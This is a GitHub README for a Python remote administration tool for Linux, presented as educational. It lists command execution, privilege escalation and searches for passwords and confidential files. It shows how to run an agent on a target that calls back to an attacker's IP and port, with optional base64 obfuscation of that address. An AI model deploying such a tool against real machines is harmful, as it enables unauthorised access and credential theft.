# Rattlesnake  
A linux remote administration tool created in Python, made for **educational** purposes only.  
 
## Features:  

### Command execution  
![RCE Demo](https://github.com/Cinnamon1212/rattlesnake/blob/main/image/RCEDemo.png)  

### Priv esc  
![PrivEsc Demo](https://github.com/Cinnamon1212/rattlesnake/blob/main/image/PrivEsc.png)  

Enumeration:  
* Gather system info  
* Gather permission info  
* Gather network info  
* Search for condifential or vulnerable files  
* Search for usernames and passwords  

File upload
File download

### Requirements:
* python3
``` sudo apt install python3 ```
* Linux distro (On both attacker and target, see note)
* termcolor (For controller)
``` pip3 install termcolor ```

### Usage:  
Attack machine:  
```
python3 controller.py
> Option 1
> Enter listener port
```
Target machine:
```
python3 rattlesnake.py (attack ip) (attack port)
```
Alternatively, you can hard code the IP and port (See rattlesnake.py) and base64 encode it (See calc.py and [b64encode.py](https://github.com/Cinnamon1212/rattlesnake/blob/main/examples/b64encode.py))  

## DISCLAIMER: THIS TOOL WAS CREATED FOR PENETRATION TESTERS, MALWARE ANALYSISTS AND CYBER SEC PROFESSIONALS. THIS TOOL IS ***NOT*** DESIGNED FOR MALICIOUS PURPOSES.  
### The creator is ***not*** responsible for any misuses  
Note: This tool has only been tested on Debian and Ubuntu(20.04 LTS) 
